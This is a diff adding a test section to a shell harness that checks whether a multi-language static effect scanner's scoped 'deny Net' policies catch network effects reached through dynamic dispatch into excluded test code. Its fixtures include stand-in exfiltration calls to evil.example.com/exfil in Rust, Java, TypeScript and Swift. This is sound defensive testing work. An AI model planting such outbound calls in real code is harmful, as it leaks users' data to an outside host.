@@ -15752,6 +15752,151 @@ fi
 [ "$VR_BAD" = 0 ] && echo "  -> MATCH — every exposed verb rejects --policy (exit 2, named); every not-exposed verb is confirmed absent for a reason unrelated to policy"
 [ "$VR_BAD" != 0 ] && echo "  -> DIVERGE — see the rows above"
 
+# ====================================================================================================
+# PART 85 — THE PEEK SCOPE-MATCH PROPERTY + THE CONDITIONAL `dispatch-widened` FALLBACK               [TIER 1]
+#           (SPEC §2/§6.2 ⟨0.34⟩). FOUR-WAY CARDINAL SIN, closed 2026-08-29: swift `7378f4f`, rust
+#           `27f4beb`, java `a034371`, ts `8584572` (BACKLOG "FOUR-WAY CARDINAL SIN — a peek finding is
+#           scope-matched against the WRONG ENTITY"). A peek finding is attributed to the EXCLUDED
+#           declaration, correctly — but the SCOPE TEST a `deny <Effect> <scope>` rule runs was matched
+#           ONLY against that declaration's own qualified name, so a rule scoped to the IN-SCOPE CALLER
+#           that reaches it via dynamic dispatch (interface/protocol/trait/structural conformance) could
+#           never match, and a real, denied effect passed silently at exit 0 — while the unscoped form of
+#           the identical rule on the identical tree already caught it. Falsified against each engine's
+#           own pre-fix commit below: every one reddens on the DEFECT cell alone, with the CONTROL and
+#           OVER-CHARGE cells unmoved, isolating the scope test (not attribution, not the fixture) as
+#           what changed. See peek_scope_check.py's own docstring for the full property and what this
+#           row deliberately does NOT assert (a genuine `dispatch-widened`-firing case per engine).
+# ====================================================================================================
+echo
+P85_OK=0
+P85="$W/peek85"; mkdir -p "$P85"
+
+# ---- rust — the excluded declaration lives in tests/ (SPEC ⟨0.29⟩ `non-library-target`); rust's peek
+# never unions in-scope and excluded material, so it cross-references dispatch SITES the primary already
+# computed (`27f4beb`) rather than re-analysing — attribution is never ambiguous, hence never `dispatch-widened`.
+if [ -x "$SCAN" ]; then
+  mkdir -p "$P85/rs/src" "$P85/rs/tests"
+  printf '[package]\nname="p85"\nversion="0.0.0"\nedition="2021"\n' > "$P85/rs/Cargo.toml"
+  printf 'pub trait Doer { fn work(&self); }\npub struct PureDoer;\nimpl Doer for PureDoer { fn work(&self) {} }\npub struct Runner;\nimpl Runner { pub fn dispatch(d: &dyn Doer) { d.work(); } }\n' > "$P85/rs/src/lib.rs"
+  printf 'use p85::Doer;\npub struct EvilDoer;\nimpl Doer for EvilDoer { fn work(&self) { let _ = std::net::TcpStream::connect("evil.example.com:80"); } }\n' > "$P85/rs/tests/evil.rs"
+  printf 'deny Net Runner\n' > "$P85/rs/scoped.pol"; printf 'deny Net\n' > "$P85/rs/unscoped.pol"; printf 'deny Net NoSuchCaller\n' > "$P85/rs/nomatch.pol"
+fi
+# ---- java — the excluded declaration is a loose `.java` beside its compiled siblings (SPEC ⟨0.29⟩
+# `source-without-class`); java's fix (`a034371`) re-runs its OWN `runScan` over a scratch union rather
+# than a second dispatch resolver.
+mkdir -p "$P85/java/src/com/x"
+printf 'package com.x;\npublic interface Doer { void work(); }\n' > "$P85/java/src/com/x/Doer.java"
+printf 'package com.x;\npublic class PureDoer implements Doer { public void work(){} }\n' > "$P85/java/src/com/x/PureDoer.java"
+printf 'package com.x;\npublic class RunnerCaller { public static void invoke(Doer d){ d.work(); } }\n' > "$P85/java/src/com/x/RunnerCaller.java"
+# Compiled DIRECTLY under the scan root (not a nested `classes/`): isolates the SCOPE-MATCH defect this
+# row exists for from the ⟨0.29⟩ classpath-resolution bug `a034371` also fixed as an ancillary — a
+# `classes/` subdirectory one level down trips the PRE-FIX binary's naive scan-root-literal classpath
+# (measured: it makes the source-peek fail closed, `peeked: false`, exit 2 on ALL THREE policies
+# uniformly, which would conflate two different bugs in one row) and is unaffected by the fix this row
+# actually pins, so a flat layout is what isolates it.
+javac -d "$P85/java" "$P85/java/src/com/x/Doer.java" "$P85/java/src/com/x/PureDoer.java" "$P85/java/src/com/x/RunnerCaller.java" 2>/dev/null
+printf 'package com.x;\npublic class EvilDoer implements Doer { public void work(){ try { new java.net.URL("http://evil.example.com/exfil").openConnection().getInputStream(); } catch (Exception e) {} } }\n' > "$P85/java/src/com/x/EvilDoer.java"
+printf 'deny Net Runner\n' > "$P85/java/scoped.pol"; printf 'deny Net\n' > "$P85/java/unscoped.pol"; printf 'deny Net NoSuchCaller\n' > "$P85/java/nomatch.pol"
+# ---- ts — the excluded declaration is a `*.test.ts` (SPEC ⟨0.29⟩ `test-file`); ts's fix (`8584572`)
+# correlates a syntactic `satisfies` annotation against interfaces the primary already dispatches into.
+if [ -n "$TS_PRESENT" ]; then
+  mkdir -p "$P85/ts/src" "$P85/ts/tests"
+  printf 'export interface Doer { work(): void; }\nexport class PureDoer implements Doer { work(): void { } }\n' > "$P85/ts/src/doer.ts"
+  printf 'import { Doer, PureDoer } from "./doer";\nexport function createDoer(): Doer { return new PureDoer(); }\n' > "$P85/ts/src/factory.ts"
+  printf 'import { createDoer } from "./factory";\nexport class RunnerMain {\n  static invoke(): void {\n    const d = createDoer();\n    d.work();\n  }\n}\n' > "$P85/ts/src/runner.ts"
+  printf 'import { Doer } from "../src/doer";\nexport class EvilDoer implements Doer {\n  work(): void { fetch("https://evil.example.com/exfil"); }\n}\n' > "$P85/ts/tests/evil.test.ts"
+  printf 'deny Net Runner\n' > "$P85/ts/scoped.pol"; printf 'deny Net\n' > "$P85/ts/unscoped.pol"; printf 'deny Net NoSuchCaller\n' > "$P85/ts/nomatch.pol"
+  # A SEPARATE tree, POSITIVE proof `dispatch-widened` genuinely fires rather than only never firing: the
+  # excluded conformer's `implements` target is reached only through a `paths`-mapped alias (`@app/*`) the
+  # peek's own synthetic re-parse tsconfig has no `paths` for, so attribution is genuinely unresolvable —
+  # the exact shape ts's own regression suite uses for this fixture (test.mjs, `8584572`).
+  mkdir -p "$P85/tsdw/src" "$P85/tsdw/tests"
+  printf '{"compilerOptions":{"target":"ES2022","module":"commonjs","baseUrl":".","paths":{"@app/*":["src/*"]}},"include":["src","tests"]}\n' > "$P85/tsdw/tsconfig.json"
+  printf 'export interface Doer { work(): void; }\nexport class PureDoer implements Doer { work(): void { } }\n' > "$P85/tsdw/src/doer.ts"
+  printf 'import { Doer, PureDoer } from "@app/doer";\nexport function createDoer(): Doer { return new PureDoer(); }\n' > "$P85/tsdw/src/factory.ts"
+  printf 'import { createDoer } from "./factory";\nexport class RunnerMain {\n  static invoke(): void {\n    const d = createDoer();\n    d.work();\n  }\n}\n' > "$P85/tsdw/src/runner.ts"
+  printf 'import { Doer } from "@app/doer";\nexport class EvilDoer implements Doer {\n  work(): void { fetch("https://evil.example.com/exfil"); }\n}\n' > "$P85/tsdw/tests/evil.test.ts"
+  printf 'deny Net Runner\n' > "$P85/tsdw/scoped.pol"
+fi
+# ---- swift — the excluded declaration lives under Tests/ (SPEC ⟨0.29⟩ `harness-target`); swift's fix
+# (`7378f4f`) diffs the child's CHA-union effect set against the primary's own finalized result.
+if [ -n "$SW_PRESENT" ]; then
+  mkdir -p "$P85/sw/Sources/App" "$P85/sw/Tests/AppTests"
+  printf '// swift-tools-version: 6.0\nimport PackageDescription\nlet package = Package(name: "App", targets: [.executableTarget(name: "App")])\n' > "$P85/sw/Package.swift"
+  printf 'protocol Doer { func work() }\nstruct PureDoer: Doer { func work() { } }\n' > "$P85/sw/Sources/App/Doer.swift"
+  printf 'struct RunnerCaller {\n    static func invoke() {\n        let d: Doer = PureDoer()\n        d.work()\n    }\n}\n' > "$P85/sw/Sources/App/RunnerCaller.swift"
+  printf 'import XCTest\nimport Foundation\nstruct EvilDoer: Doer {\n    func work() {\n        let url = URL(string: "https://evil.example.com/exfil")!\n        URLSession.shared.dataTask(with: url) { _, _, _ in }.resume()\n    }\n}\n' > "$P85/sw/Tests/AppTests/EvilTests.swift"
+  printf 'deny Net Runner\n' > "$P85/sw/scoped.pol"; printf 'deny Net\n' > "$P85/sw/unscoped.pol"; printf 'deny Net NoSuchCaller\n' > "$P85/sw/nomatch.pol"
+fi
+
+echo "[85] THE PEEK SCOPE-MATCH PROPERTY — a scope written against the IN-SCOPE CALLER must catch an effect reached only via dynamic dispatch into excluded code (SPEC §2/§6.2 ⟨0.34⟩)"
+if [ -x "$SCAN" ]; then
+  ( cd "$P85/rs" && "$SCAN" . --out sc --policy scoped.pol   >/dev/null 2>&1 ); r85sc=$?
+  ( cd "$P85/rs" && "$SCAN" . --out un --policy unscoped.pol >/dev/null 2>&1 ); r85un=$?
+  ( cd "$P85/rs" && "$SCAN" . --out nm --policy nomatch.pol  >/dev/null 2>&1 ); r85nm=$?
+  python3 "$HERE/peek_scope_check.py" "rust" "$r85sc" "$P85/rs/sc.p85.scan.json" "$r85un" "$P85/rs/un.p85.scan.json" "$r85nm" "$P85/rs/nm.p85.scan.json" || P85_OK=1
+  python3 "$HERE/peek_scope_check.py" --forbid-widened-corpus "rust" "$P85/rs/sc.p85.scan.json" "$P85/rs/un.p85.scan.json" "$P85/rs/nm.p85.scan.json" || P85_OK=1
+else
+  echo "  rust   -> SKIP     (no candor-scan binary — this engine was NOT asked)"
+fi
+java -jar "$JAR" "$P85/java" --json "$P85/java/sc.json" --policy "$P85/java/scoped.pol"   >/dev/null 2>&1; j85sc=$?
+java -jar "$JAR" "$P85/java" --json "$P85/java/un.json" --policy "$P85/java/unscoped.pol" >/dev/null 2>&1; j85un=$?
+java -jar "$JAR" "$P85/java" --json "$P85/java/nm.json" --policy "$P85/java/nomatch.pol"  >/dev/null 2>&1; j85nm=$?
+python3 "$HERE/peek_scope_check.py" "java" "$j85sc" "$P85/java/sc.json" "$j85un" "$P85/java/un.json" "$j85nm" "$P85/java/nm.json" || P85_OK=1
+if [ -n "$TS_PRESENT" ]; then
+  ( cd "$TS_DIR" && node scan.mjs "$P85/ts" --out "$P85/ts/sc" --policy "$P85/ts/scoped.pol"   >/dev/null 2>&1 ); t85sc=$?
+  ( cd "$TS_DIR" && node scan.mjs "$P85/ts" --out "$P85/ts/un" --policy "$P85/ts/unscoped.pol" >/dev/null 2>&1 ); t85un=$?
+  ( cd "$TS_DIR" && node scan.mjs "$P85/ts" --out "$P85/ts/nm" --policy "$P85/ts/nomatch.pol"  >/dev/null 2>&1 ); t85nm=$?
+  python3 "$HERE/peek_scope_check.py" "ts" "$t85sc" "$P85/ts/sc.json" "$t85un" "$P85/ts/un.json" "$t85nm" "$P85/ts/nm.json" || P85_OK=1
+  ( cd "$TS_DIR" && node scan.mjs "$P85/tsdw/tsconfig.json" --out "$P85/tsdw/dw" --policy "$P85/tsdw/scoped.pol" >/dev/null 2>&1 ); t85dw=$?
+  python3 - "$t85dw" "$P85/tsdw/dw.json" <<'PY' || P85_OK=1
+import json, sys
+rc, path = sys.argv[1], sys.argv[2]
+try:
+    d = json.load(open(path))
+except Exception as e:
+    print(f"  ts (dispatch-widened positive) -> DIVERGE  (report unreadable: {e})"); sys.exit(1)
+oos = d.get("outOfScope") or []
+widened = [e for e in oos if e.get("class") == "dispatch-widened" and "Net" in (e.get("effects") or [])]
+if rc != "2" or not widened:
+    print(f"  ts (dispatch-widened positive) -> DIVERGE  (a genuinely unattributable excluded conformer "
+          f"reached only via a `paths`-mapped alias the peek's re-parse cannot resolve must disclose under "
+          f"`dispatch-widened` rather than drop the finding: exit {rc}, outOfScope={oos})")
+    sys.exit(1)
+print("  ts (dispatch-widened positive) -> MATCH    (an unattributable excluded conformer discloses under "
+      "`dispatch-widened` rather than being dropped — the fallback genuinely fires when attribution cannot "
+      "name a single declaration)")
+PY
+else
+  echo "  ts     -> SKIP     (candor-ts absent — this engine was NOT asked)"
+fi
+if [ -n "$SW_PRESENT" ]; then
+  ( cd "$P85/sw" && "$SW_BIN" . --out sc --policy scoped.pol   >/dev/null 2>&1 ); s85sc=$?
+  ( cd "$P85/sw" && "$SW_BIN" . --out un --policy unscoped.pol >/dev/null 2>&1 ); s85un=$?
+  ( cd "$P85/sw" && "$SW_BIN" . --out nm --policy nomatch.pol  >/dev/null 2>&1 ); s85nm=$?
+  python3 "$HERE/peek_scope_check.py" "swift" "$s85sc" "$(ls "$P85"/sw/sc.*.Swift.json 2>/dev/null | grep -vE 'callgraph|hierarchy|locs' | head -1)" \
+      "$s85un" "$(ls "$P85"/sw/un.*.Swift.json 2>/dev/null | grep -vE 'callgraph|hierarchy|locs' | head -1)" \
+      "$s85nm" "$(ls "$P85"/sw/nm.*.Swift.json 2>/dev/null | grep -vE 'callgraph|hierarchy|locs' | head -1)" || P85_OK=1
+else
+  echo "  swift  -> SKIP     (no swift toolchain — this engine was NOT asked)"
+fi
+echo "PART 85 — the peek scope-match property: a scoped rule must consider every in-scope caller that reaches an excluded declaration via dynamic dispatch, and \`dispatch-widened\` fires only where attribution is genuinely ambiguous (SPEC §2/§6.2 ⟨0.34⟩)"
+# ENGINES: rust java ts swift
+# CONTROLS: unscoped nomatch — unscoped proves the widened scope test does not double-report a declaration
+# its own unscoped name already matched; nomatch is the OVER-CHARGE control, a scope matching neither the
+# declaration nor any reaching caller, which must stay silent rather than widen to "any exclusion, any
+# scope". peek_scope_check.py's own attribution/dispatch-widened assertions (naming the declaration, never
+# the caller; never falling back to `dispatch-widened` when attribution is unambiguous) and rust's
+# structural corpus-wide absence of the class plus ts's positive dispatch-widened firing travel inside the
+# same checks, not as separately declared controls.
+if [ "$P85_OK" = 0 ]; then
+  echo "  -> MATCH — every engine's scoped rule now catches the effect reached via dispatch into excluded"
+  echo "     code, names the excluded declaration (never the caller, never a spurious dispatch-widened),"
+  echo "     the unscoped control stays a single finding, and a non-matching scope stays silent"
+else
+  echo "  -> DIVERGE — see the rows above"; rc=1
+fi
+
 # ⟨0.28⟩ THE SKIP RATCHET — last, because it reads the log of everything above it. See
 # `skip_ratchet.py`'s header: a reference-led SKIP means "this engine has not shipped the rung", so a
 # rung that UN-SHIPS looks identical to one that never shipped. Measured: removing candor-rust's Rung A
